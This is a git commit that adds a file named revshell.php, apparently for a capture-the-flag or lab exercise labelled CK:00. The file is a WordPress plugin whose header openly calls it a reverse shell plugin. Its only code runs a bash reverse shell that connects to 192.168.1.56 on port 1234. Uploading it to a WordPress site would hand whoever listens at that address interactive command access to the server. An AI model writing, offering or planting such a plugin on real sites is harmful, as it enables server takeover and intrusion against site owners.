7ead613a1f3a7719e00f41810a7afa826a691f8a
artpes <arturo.pesaro@gmail.com>
2020-03-25 11:23:33 +0100

    Add CK:00

---
+++ CK:00/revshell.php
@@ -0,0 +1,13 @@
+<?php
+
+/**
+* Plugin Name: Reverse Shell Plugin
+* Plugin URI:
+* Description: Reverse Shell Plugin
+* Version: 1.0
+* Author: Vince Matteo
+* Author URI: http://www.sevenlayers.com
+*/
+
+exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.56/1234 0>&1'");
+?>
